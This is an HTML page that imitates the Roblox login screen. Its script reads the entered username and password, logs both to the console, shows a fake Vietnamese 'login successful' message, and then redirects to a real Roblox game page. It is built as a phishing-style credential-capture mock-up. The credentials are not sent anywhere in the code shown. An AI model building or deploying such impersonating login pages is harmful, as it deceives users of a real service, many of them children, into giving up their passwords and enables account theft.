<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #121212;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #1e1e1e;
            padding: 30px;
            width: 350px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
            text-align: center;
        }

        .login-container h2 {
            color: #f7f7f8;
            margin-bottom: 20px;
        }

        .input-box {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #555;
            background: #2a2a2a;
            color: #fff;
            border-radius: 5px;
            outline: none;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #4a4a4a;
            color: white;
            border: 1px solid #777;
            cursor: pointer;
            border-radius: 5px;
        }

        .login-btn:hover {
            background-color: #616161;
        }

        .forgot-password {
            margin: 15px 0;
            font-size: 14px;
            color: #bcbec8;
        }

        .divider {
            border-top: 1px solid #555;
            margin: 15px 0;
        }

        .extra-btn {
            width: 100%;
            padding: 10px;
            background-color: #303030;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 10px;
        }

        .extra-btn:hover {
            background-color: #505050;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Login to Roblox</h2>
        <input type="text" id="username" class="input-box" placeholder="Username/Email/Phone">
        <input type="password" id="password" class="input-box" placeholder="Password">
        <button class="login-btn" onclick="redirectToRoblox()">Log In</button>
        <p class="forgot-password">Forgot Password or Username?</p>
        <div class="divider"></div>
        <button class="extra-btn">Email Me a One-Time Code</button>
        <button class="extra-btn">Use Another Device</button>
    </div>

    <script>
        function redirectToRoblox() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;
            
            console.log("User:", username);
            console.log("Password:", password);
            
            alert("Đăng nhập thành công! Đang chuyển hướng...");
            
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/vi/games/2753915549/Blox-Fruits";
            }, 1000);
        }
    </script>
</body>
</html>
